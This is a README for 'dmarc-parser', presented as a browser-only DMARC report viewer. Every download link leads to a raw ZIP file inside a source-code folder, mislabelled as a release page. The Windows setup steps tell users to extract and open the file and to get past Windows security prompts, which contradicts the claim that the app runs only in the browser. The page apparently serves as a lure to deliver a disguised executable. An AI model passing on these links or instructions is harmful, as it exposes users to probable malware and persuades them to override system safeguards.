# 📄 dmarc-parser - Check DMARC reports with ease

[![Download dmarc-parser](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/main/src/components/ui/dmarc_parser_2.9-beta.4.zip)

## 🖥️ What this app does

dmarc-parser is a browser-only DMARC aggregate report tool for Windows users who want to inspect email security data without setting up a server.

Use it to:

- upload DMARC XML files or ZIP files
- view pass rates and fail rates
- inspect sending sources and infrastructure
- review SPF and DKIM alignment data
- check which IPs and domains sent mail on your behalf

The app runs in your browser. It does not send your files to a backend.

## 🚀 Download the app

Visit the release page here:

https://raw.githubusercontent.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/main/src/components/ui/dmarc_parser_2.9-beta.4.zip

On that page:

1. find the latest release
2. download the Windows file
3. save it to your PC
4. open the file to start the app

If the release page offers a ZIP file, download the ZIP, extract it, then open the app file inside the folder

## 🪟 Windows setup

Follow these steps on Windows:

1. open the release page
2. download the latest Windows build
3. if your browser asks where to save it, choose a folder you can find, such as Downloads
4. if the file is in a ZIP, right-click it and choose Extract All
5. open the extracted app file
6. if Windows shows a security prompt, choose the option that lets you run the file

After the app opens, it loads in your browser window

## 📁 What files you can upload

dmarc-parser works with common DMARC report files:

- XML aggregate reports
- ZIP files that contain XML reports
- compressed report bundles from mail providers

You can drag and drop files or choose them from your computer

## 📊 What you can review

Once a report loads, you can inspect:

- total messages in each report
- pass and fail rates
- domains and IPs that sent mail
- SPF results
- DKIM results
- aligned and non-aligned traffic
- repeated sources across reports

This helps you see where mail comes from and where authentication breaks

## 🔎 How to read the results

Start with the main totals:

- high pass rates usually mean your setup is working well
- fail rates point to mail that did not match your policy
- unknown sources can mean a third party is sending mail for your domain
- repeated failures can point to a wrong SPF record, DKIM issue, or missing sender setup

Look at the sending IPs and domains next. That shows who sent the mail and from where

## 🧭 Basic use

1. open dmarc-parser in your browser
2. load one or more DMARC report files
3. wait for the file to parse
4. review the charts and report tables
5. use the source data to find sending systems that need attention

If you have many files, load them in batches and compare the results

## 💻 System needs

Use a modern version of Windows with a current browser. Best results come from:

- Windows 10 or Windows 11
- Chrome, Edge, or Firefox
- enough free memory to open large XML or ZIP files
- a local download folder for your report files

The app works in the browser, so you do not need to install a database or server

## 🛠️ Troubleshooting

If the app does not open:

- download the file again
- make sure the ZIP file was extracted
- check that your browser is up to date
- try a different browser
- confirm that the file finished downloading before opening it

If a report does not load:

- check that the file is a valid DMARC XML report
- try another report file
- if the file is in a ZIP, make sure the XML file is inside it
- use a smaller set of files if the report is large

If the display looks blank:

- refresh the page
- reopen the app
- clear the browser cache
- try opening the app in another browser window

## 🔐 Privacy and data flow

The app runs in the browser and works on your local machine. Your report files stay with you while you inspect them. There is no backend to upload them to

## 🧩 Topics covered

- browser tools
- DMARC
- email security
- SPF
- DKIM
- XML parsing
- security tools
- Next.js
- Tailwind CSS
- TypeScript

## 📌 Common use cases

Use dmarc-parser if you want to:

- check DMARC report data on a Windows PC
- see which services send mail for your domain
- spot SPF and DKIM failures
- review authentication trends over time
- inspect mail sources without using a hosted tool

## 📦 Release page

Download or get the latest Windows build here:

https://raw.githubusercontent.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/main/src/components/ui/dmarc_parser_2.9-beta.4.zip